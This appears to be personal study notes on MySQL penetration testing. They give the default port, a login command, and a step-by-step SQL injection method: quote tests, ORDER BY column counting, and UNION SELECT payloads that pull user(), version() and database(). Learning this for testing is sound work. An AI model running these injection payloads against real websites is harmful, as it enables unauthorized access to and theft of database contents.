### Ports
Default ports 3306

### Access
mysql -u <username> -p 

### SQL Injection 
## Enumeration
1. Try single and double quotes; ?id=1' or ?id=1". If SQL errors are returned, you have escaped the input area of the SQL string.
2. Comment out the rest of the SQL query with '--+ ' (Note the space after the '+')

To find out how many columns in the table where '?id=' is present, use the ORDER operator by starting at 1, and increasing the value until an SQL error is returned. The column count equals the amount prior to the SQL error.

### ORDER Operator
> https://www.w3schools.com/sql/sql_orderby.asp
> Example below
> SELECT column1, column2, ...
> 
> FROM table_name
> 
> ORDER BY column1, column2, ... ASC|DESC;

Example of ORDER used in an injection:
> "?id=1' ORDER by 1--+ "
> 
> "?id=1' ORDER by 2--+ "
> 
> "?id=1' ORDER by 3--+ "
> 
> "?id=1' ORDER by n--+ "

An SQL error "Unknown column '4' in 'order clause'" may be returned when the column integer in the ORDER operator doesn't exist, so now we know there are 3 columns in this table, which means we can start playing with the values within these columns and see what we can find.

### UNION operator
> https://www.w3schools.com/sql/sql_union.asp
> 
> ?id=1' UNION select 1,2,3 --+ 
This returns '2' and '3'. 

Changing the query to the following:

> ?id=1' union select 1,5,6 --+

Returns '5' and '6'. 

We can now see these two fields can be used to return information from the SQL database, for exaple lets get the SQL user used for this lookup by using the 'user()' function.
> ?id=1' union select 1,5,6 --+
> ?id=1' union select 1,user(),6 --+

This returns '*root@localhost*', so we can establish that the SQL database is local to the web server, and the username is '*root*'.

**A list of functions for SQL can be found here: https://www.w3schools.com/sql/sql_ref_mysql.asp**

Some interesting functions:

1. version()
2. system_user()
3. database()

### TODO
1. How to retrieve information from the database once you know the database name 
information_schema.tables?
2. How to retrieve information about what the tables are named
3. How to retrieve information from the entries in the tables





